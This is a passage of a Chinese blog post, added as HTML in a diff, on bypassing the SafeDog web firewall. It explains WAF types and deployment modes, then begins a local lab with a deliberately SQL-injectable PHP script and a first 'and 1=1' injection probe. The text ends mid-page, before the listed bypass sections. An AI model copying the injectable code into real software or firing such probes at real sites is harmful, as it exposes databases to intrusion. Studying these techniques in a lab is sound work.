@@ -1,0 +1,638 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>绕waf系列之绕安全狗 - bysec</title><meta name="Description" content="bysec个人博客"><meta property="og:title" content="绕waf系列之绕安全狗" />
+<meta property="og:description" content="攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品: 云WAF 阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等 软件产品类 安全狗" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" /><meta property="og:image" content="http://localhost:1313/logo.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-12-15T21:18:35+08:00" />
+<meta property="article:modified_time" content="2020-12-15T21:18:35+08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/logo.png" /><meta name="twitter:title" content="绕waf系列之绕安全狗"/>
+<meta name="twitter:description" content="攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品: 云WAF 阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等 软件产品类 安全狗"/>
+<meta name="application-name" content="bysec">
+<meta name="apple-mobile-web-app-title" content="bysec">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://q.qlogo.cn/headimg_dl?dst_uin=1726946232&amp;spec=100"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" /><link rel="next" href="http://localhost:1313/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "绕waf系列之绕安全狗",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97\/"
+        },"genre": "posts","keywords": "waf","wordcount":  2185 ,
+        "url": "http:\/\/localhost:1313\/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97\/","datePublished": "2020-12-15T21:18:35+08:00","dateModified": "2020-12-15T21:18:35+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "bysec"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="bysec">bysec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"><i class='fa-fw fas fa-home'></i> 首页 </a><a class="menu-item" href="/posts/"><i class='fa-fw fas fa-archive'></i> 归档 </a><a class="menu-item" href="/categories/"><i class='fa-fw fas fa-folder-open'></i> 分类 </a><a class="menu-item" href="/tags/"><i class='fa-fw fas fa-tags'></i> 标签 </a><a class="menu-item" href="/link/"><i class='fa-fw fas fa-link'></i> 友链 </a><a class="menu-item" href="/about/"><i class='fa-fw fas fa-comment-dots'></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="bysec">bysec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title=""><i class='fa-fw fas fa-home'></i>首页</a><a class="menu-item" href="/posts/" title=""><i class='fa-fw fas fa-archive'></i>归档</a><a class="menu-item" href="/categories/" title=""><i class='fa-fw fas fa-folder-open'></i>分类</a><a class="menu-item" href="/tags/" title=""><i class='fa-fw fas fa-tags'></i>标签</a><a class="menu-item" href="/link/" title=""><i class='fa-fw fas fa-link'></i>友链</a><a class="menu-item" href="/about/" title=""><i class='fa-fw fas fa-comment-dots'></i>关于</a><a href="#" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#云waf">云WAF</a></li>
+    <li><a href="#软件产品类">软件产品类</a></li>
+    <li><a href="#硬件类型设备">硬件类型设备:</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#基于dns解析">基于DNS解析</a></li>
+    <li><a href="#串联模式">串联模式</a></li>
+    <li><a href="#旁路模式">旁路模式</a></li>
+    <li><a href="#软件嵌入中间件检测引擎模式">软件嵌入中间件+检测引擎模式</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#实验环境">实验环境:</a></li>
+    <li><a href="#绕过拦截and-11">绕过拦截and 1=1</a></li>
+    <li><a href="#绕过order-by查询">绕过order by查询</a></li>
+    <li><a href="#绕过union-select查询">绕过union select查询</a></li>
+    <li><a href="#绕过select-from">绕过select from</a></li>
+    <li><a href="#缓冲区溢出绕waf">缓冲区溢出绕waf</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">绕waf系列之绕安全狗</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="https://www.bysec.cn/" title="Author" target="_blank" rel="noopener noreferrer author" class="author">bysec</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw"></i>技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-12-15">2020-12-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-12-15">2020-12-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2185 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#云waf">云WAF</a></li>
+    <li><a href="#软件产品类">软件产品类</a></li>
+    <li><a href="#硬件类型设备">硬件类型设备:</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#基于dns解析">基于DNS解析</a></li>
+    <li><a href="#串联模式">串联模式</a></li>
+    <li><a href="#旁路模式">旁路模式</a></li>
+    <li><a href="#软件嵌入中间件检测引擎模式">软件嵌入中间件+检测引擎模式</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#实验环境">实验环境:</a></li>
+    <li><a href="#绕过拦截and-11">绕过拦截and 1=1</a></li>
+    <li><a href="#绕过order-by查询">绕过order by查询</a></li>
+    <li><a href="#绕过union-select查询">绕过union select查询</a></li>
+    <li><a href="#绕过select-from">绕过select from</a></li>
+    <li><a href="#缓冲区溢出绕waf">缓冲区溢出绕waf</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="攻击的特定" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e7%9a%84%e7%89%b9%e5%ae%9a" class="header-mark"></a>攻击的特定:</h1><p>攻击二象性:已知攻击和未知攻击</p>
+<h1 id="目前市面主流的waf产品" class="headerLink">
+    <a href="#%e7%9b%ae%e5%89%8d%e5%b8%82%e9%9d%a2%e4%b8%bb%e6%b5%81%e7%9a%84waf%e4%ba%a7%e5%93%81" class="header-mark"></a>目前市面主流的WAF产品:</h1><h2 id="云waf" class="headerLink">
+    <a href="#%e4%ba%91waf" class="header-mark"></a>云WAF</h2><ul>
+<li>阿里云盾</li>
+<li>腾讯网站管家</li>
+<li>创宇盾</li>
+<li>ClodeFlare等</li>
+</ul>
+<h2 id="软件产品类" class="headerLink">
+    <a href="#%e8%bd%af%e4%bb%b6%e4%ba%a7%e5%93%81%e7%b1%bb" class="header-mark"></a>软件产品类</h2><ul>
+<li>安全狗</li>
+<li>云锁</li>
+<li>360主机卫士</li>
+<li>ModSecurity</li>
+</ul>
+<h2 id="硬件类型设备" class="headerLink">
+    <a href="#%e7%a1%ac%e4%bb%b6%e7%b1%bb%e5%9e%8b%e8%ae%be%e5%a4%87" class="header-mark"></a>硬件类型设备:</h2><ul>
+<li>启明星辰</li>
+<li>绿盟</li>
+<li>天融信</li>
+<li>飞塔等</li>
+</ul>
+<p>硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过</p>
+<h1 id="waf的核心原理" class="headerLink">
+    <a href="#waf%e7%9a%84%e6%a0%b8%e5%bf%83%e5%8e%9f%e7%90%86" class="header-mark"></a>WAF的核心原理:</h1><ul>
+<li>运用黑白思想</li>
+<li>特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞</li>
+<li>对匹配结果进行响应(拦截,记录)</li>
+</ul>
+<h1 id="waf的几种部署模式" class="headerLink">
+    <a href="#waf%e7%9a%84%e5%87%a0%e7%a7%8d%e9%83%a8%e7%bd%b2%e6%a8%a1%e5%bc%8f" class="header-mark"></a>WAF的几种部署模式:</h1><h2 id="基于dns解析" class="headerLink">
+    <a href="#%e5%9f%ba%e4%ba%8edns%e8%a7%a3%e6%9e%90" class="header-mark"></a>基于DNS解析</h2><p>修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png">
+    </a></figure></p>
+<h2 id="串联模式" class="headerLink">
+    <a href="#%e4%b8%b2%e8%81%94%e6%a8%a1%e5%bc%8f" class="header-mark"></a>串联模式</h2><p>一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png">
+    </a></figure></p>
+<h2 id="旁路模式" class="headerLink">
+    <a href="#%e6%97%81%e8%b7%af%e6%a8%a1%e5%bc%8f" class="header-mark"></a>旁路模式</h2><p>利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png">
+    </a></figure></p>
+<h2 id="软件嵌入中间件检测引擎模式" class="headerLink">
+    <a href="#%e8%bd%af%e4%bb%b6%e5%b5%8c%e5%85%a5%e4%b8%ad%e9%97%b4%e4%bb%b6%e6%a3%80%e6%b5%8b%e5%bc%95%e6%93%8e%e6%a8%a1%e5%bc%8f" class="header-mark"></a>软件嵌入中间件+检测引擎模式</h2><p>在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png">
+    </a></figure></p>
+<h1 id="waf为什么会被绕过" class="headerLink">
+    <a href="#waf%e4%b8%ba%e4%bb%80%e4%b9%88%e4%bc%9a%e8%a2%ab%e7%bb%95%e8%bf%87" class="header-mark"></a>WAF为什么会被绕过:</h1><ol>
+<li>鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作</li>
+<li>WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性</li>
+<li>硬件WAF自身往往存在漏洞
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png">
+    </a></figure></li>
+</ol>
+<ul>
+<li>架构:waf部署模式</li>
+<li>规则缺陷/特性</li>
+<li>协议:指HTTP0.9协议:TCP长连接</li>
+</ul>
+<h1 id="waf绕过实战-绕过安全狗进行注入" class="headerLink">
+    <a href="#waf%e7%bb%95%e8%bf%87%e5%ae%9e%e6%88%98-%e7%bb%95%e8%bf%87%e5%ae%89%e5%85%a8%e7%8b%97%e8%bf%9b%e8%a1%8c%e6%b3%a8%e5%85%a5" class="header-mark"></a>WAF绕过实战—-绕过安全狗进行注入</h1><p>所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护</p>
+<h2 id="实验环境" class="headerLink">
+    <a href="#%e5%ae%9e%e9%aa%8c%e7%8e%af%e5%a2%83" class="header-mark"></a>实验环境:</h2><p>环境:安全狗Apache最新版
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png">
+    </a></figure></p>
+<p>本地测试代码(PHP):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$con</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;dvwa&#34;</span><span class="p">,</span> <span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT first_name,last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39;; &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&amp;nbsp&#34;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;}</span><span class="k">echo</span> <span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="p">;</span><span class="k">echo</span> <span class="nv">$query</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="绕过拦截and-11" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87%e6%8b%a6%e6%88%aaand-11" class="header-mark"></a>绕过拦截and 1=1</h2><p>首先先稍微测试一番,发现存在安全狗</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1  and 1=1%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png">
+        <img
+            
+            loading="lazy"
